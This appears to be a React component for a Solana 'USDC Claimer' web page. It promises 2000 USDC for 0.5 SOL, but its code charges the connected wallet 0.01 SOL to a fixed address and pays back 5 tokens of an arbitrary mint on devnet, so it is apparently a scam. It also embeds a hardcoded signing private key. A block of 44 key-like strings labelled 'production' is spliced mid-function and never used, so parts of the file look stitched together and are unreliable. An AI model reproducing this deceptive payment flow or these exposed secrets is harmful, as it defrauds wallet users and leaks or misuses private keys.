/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "bc2i2bn2AS4QDJyHR7sesCr95JieeFGWYHyusm2fKmCsubeSuxaF8Fi9AKvRDERhT4MVVAUUh5f1PbhiErXuFJv"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "zDcjvVikxFa64A31QKS8HqZChifBJZqw3zhm1CGwn4e2NjAHF6vuza6pa7wxJwWDP7Z48bxm5keF6QCBV2FQezt",
  "key1": "4DZcfvnJpw9AgbMyaye5EHerJmzCaziWyA5D9fVmJE5JAshbhexiv9f4jJavEg7q2vCS5XRDLnKfmMXxgA6V6tXL",
  "key2": "5FNYMniWE9S7PxezoVLNNRQywUBYRdwioeqUBBHSPAqkpE2hnLAMcvgw5Jyp8Xmabq3r2MhFnr13XuE7NHGrBc4K",
  "key3": "3e7Gmrj7MCCmaqWsYYzAFqdSdNFF29375CJd8ooRrKhydSNBC6tgdbZWJXVueG32VPJSpgV5SMK5DEQmQJcV6fNr",
  "key4": "3BxDdVZuzCUpmj5ynQ2MdUHYyHjimMe4YM6vXJkA5ZMp3nuLpTejGxjARSaEDQWeGf6WFg35U8wAB8GbcBPxa3wT",
  "key5": "2qPc1Z1hN8foLyrNZbEeBWiAYnUTc2pZJ4TGugDLoKuYY86WrimZ6y7YbktWuaR2HTVkdZS5bqBZH58hJsUJb4MT",
  "key6": "63uG5hpXEgLHjyQBXjue3CB8yHf5PjDPmGPBhGCkvDfwdqTecKzPYvyw6CTwRBaD168DJCvgpt1i7ACHnza4sjea",
  "key7": "4V3uJu6kWKmAusKiPyrSu6ghSQVXYtg6cwmKoJmZTPx5CSKim8nW1siAbAnPZKhqgXkpcsdnHYcnEbxQTvjMrwrr",
  "key8": "4B6hbD9pMQ3d87H1hkNsoo53tUcrM9rmD3SnPiDSPUkWYmFME77C9enKg97X911X6NakiJVYHsFibFJubtSytyhw",
  "key9": "5pntSTwcFpyHiua1sD93UoKGNtKdg2QmSpyvbiTj4vSxNvEdfnhuz8FEFSwxHV74TGyBbZiUiLxtcdWai56JULD3",
  "key10": "39zZDqLmmxktQPK93gcfFNaM27s1gzUc7s3gXqwyjNcebWzyxCQPYEZf6TxjNUDGwYdtPyTezMwCW9QSqFKzVH3K",
  "key11": "KRZdt5WqayWvASePr1tWXLgGDcHro4Lk931CM2y1e4vTrYGRdwc7uR5LM25x9WEWbFBFN7opofg3MqWpACumrtH",
  "key12": "2mzXHZGoWespUndYRcgXMSXTfMj6kph9RDk3ByJgvvTHTuD9DANuXKmvtz7qriyi3Q72HJDJEMJwk6AQ1KUkJAMA",
  "key13": "3FULgzHaSMzLV1s5uG3kCVxgtknwdMEkzG3WqhWkk6XUjv7HCH66kxrcNcX6jp1u7EHDmFTpmeJeVP7H5keaCnLG",
  "key14": "3xoWvdSDu3tK8vL36xnutKFfiQ2en8W8NQEzUJmS2cVVrmKgBA1fN2cQtqyfwdi3G2HUCtpLdbzx9eCDdSgMcsYm",
  "key15": "5fRFtn5MTFENYtH4QGgSfUVt9SLQ5Xw8ksY9TA8aWGgXd4gR58yDnEYRdgq1PionWtU7xtSErPwNoUhMza16QbKm",
  "key16": "qitTGPxSMgVtn281MjoxDD5yLT5aijyxeBAQbxQw9GLUZAty5wYBx6KCJ45es9xn7xN5KchFCCmFU73vYdULQyg",
  "key17": "4wRmRR8LVbh9gDtfzQFDWpqaQC6CsvGP6DFrJrPRxDJKsKiBt5rHEnjas7mYvfc1BTTGsdXo8eRNg1q6vUqSu2DX",
  "key18": "4jGYRXP2u7UrmNf6es7TXCUXWfbody4k5NuzzzbjmHXuXS3RX4hB486pVGrU2DVW5vLu4d2VtwXYnituHUrfKJFu",
  "key19": "4aRoKikpsfuZvkJoNihpoa5g96HyzxKedK7EsnxnAzPmvzhAGMYukVB3ZEWpKUZhDgfM6eH4trbQ35xouHXCFFm2",
  "key20": "2x8ruX2FtZeK4dKB2NpegJRtoSP1VbrhQL7MXFTHcZ1dmPQ56TAd5Ay9mpx95owAreBo3tsKsTZPhPikcr4NqwEw",
  "key21": "bghqmcEttkLPRLdvacteFzZTd92BHyebwRZqeiqyDeVrNMQ7d9DMe1FLjV5kas3a4D6UZi95D53rAu4hYEKhHZu",
  "key22": "2md8E7dUmef2ZsM7un8LQvnLHNx1wepnZzmiAxhFFGfF4zWN6Z4uUqLdiCneZXvc4rof9hVL2URahwLnxQciu73A",
  "key23": "gUV24FBHrpAroJHGJxeR3eDGL3c3eJbQbFLPemQQo4WiPMMT1rL6j8WoCAsecHBmMokMvmEUf1coKzVbxco1zSL",
  "key24": "4SVpWoCb24aDGoumy3TfTb7eNBYDQAA3xXrfy5eZMHhqg2JvCg2t5RvEDgAmSU8Ln4DrRQ3z55otkyj7GpetyMH5",
  "key25": "3TQKXhd7b22PyLCWGT1WoiFov5vEGwTadFawR8dXaLpu95wc2wqPRj5qNZDTD14NCnyJVCrcFSzCA9sjBwT6QFDe",
  "key26": "5moCrNGysmDZNPkdMqwjLSUDZZ4Gs11P5WkDjaq8yBNsXeX3nAKXi8nNQjauN3SQSCfYQXad76cQhFdVSDXvbsPP",
  "key27": "5ehDCudYixZUyhk6iXAPmhxh5HtiXQdmod2KHVHjzWfnbwPA9NLXbccPdUYZ78NrH3AxNdbDxgaXJxHywBCB5xZ",
  "key28": "CDLbD45iU78bnLReifZF8iT3nehZqdYFbKbhD9bz7nxufMHf2aVFmJC6ULZBhmjWNrpBPHmcnKkG5Ri3doxE6xV",
  "key29": "r6RwuxVPTGXAneaJXd9LNZTw83D9fDwEhJ7WH8bR6eZkKRHTQT4EhytxZNxt9ftK7QDeSHMBFEy3ADQ57RykKim",
  "key30": "2o1j7CCkC3zMU2TQ7nycn2zNNXiEf7fF5E6F22dGcZRpRw4bVCKe63Bi1ZSoSu1ZV3LDLoWnduxYPqTEYKMcYtJe",
  "key31": "2uKjLUPKQu1qtaUj9Qioa2oBYvyTBBeoMPtTT7aLV2NUTbqwZAeZnNHf6xPqFsedvxE7XuxDiVchMhDbrabFoHuk",
  "key32": "5ugcYQygpRtEmCK1Kv3Bedzwn6dKk9TniYttd8Q4Mg5aYeFDftDaF5U7jCLcp2iCuCHoRSwFzuyL637VSnn65A8g",
  "key33": "2VZnpLJVQtCrQGQxq3BBx2gbkhtjaRfCpqACeAvVYdXVQyTUhFXUSXxkr8HeNkwJnbfeiweu41oKLheGtzxxPojL",
  "key34": "4bFoh2W3XboPpHjtQsZX7FosNCPSewco6UNwvPBLi31eaGVF683wLZZyH4BTR6dcfXtfVS6pkXvbvNCAFgAYoRtN",
  "key35": "XitAVS5BHsFfAqrBkQZdvRPeL3BfYvRTPwzHok9LjKp2kZUzZ5U2fLHKvBxXLhvo1PXSfV86fquSs9RSyWQ9XvM",
  "key36": "3YrNyYH8cUpTmE2k4H97dmAxnmYExBcfR3agdkGhrGBk74Yt3FpCmcyu3yYKKga4Bv15yA5YjCCsNzNTrEAW2kJM",
  "key37": "3F79mAGWeHUu4uaf4NhEYiykM7RrAdU5qVp7gghNZBUpnjvSrpBU2n7ipR9W9FU6epBgSXg6rQo8zPgsu8TXSW9t",
  "key38": "4J1RwtH9rVKBXz18QtZGTAG2YShTLz1Rg2kGZoZ1dKAkGb7DkU2j5umN8nEdwYEugR2g7Qt3E1szLSmPAcq8yk2B",
  "key39": "2yncNhakoHVF32d18vhS3RbQroQ6Q7EGowVWdn3jRwrm6S5RqQFfzfHRpdgUvU8j7WrgshGdDAJWoAWLH6bD7qKD",
  "key40": "3XKhSLPczknU9efaNnHpnjrh6FPyxthW4zr93imSYQo5Sqy8VmyimdzLYa5Ln7YH4iS5HYSv9eA5a2EzeaDWnJAP",
  "key41": "2isNPkNYCw7Bv5ki5TLe574WZKRVQenHHitcJMw4W2SKpNUt7quSxq6hCwZtWSfdpU9oFJ2MJLDjxX567yMLZMH7",
  "key42": "2YqcmqyHdSAdM3HvHmdG6oKnJPdwndv1zJVprTvYmuBqZC6uVR4NH7JXu9rjJ1ZXm7e2MHRfuRy2N4W7qQaB1X4r",
  "key43": "2b8fGSbKefpon5a87B8xyaDsPEhYuzPXRonQhRa6cZf5mRE8BmoGuA3LveL8KmFu8sBQVhuuCJXhW8kXmj1NP8oM"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
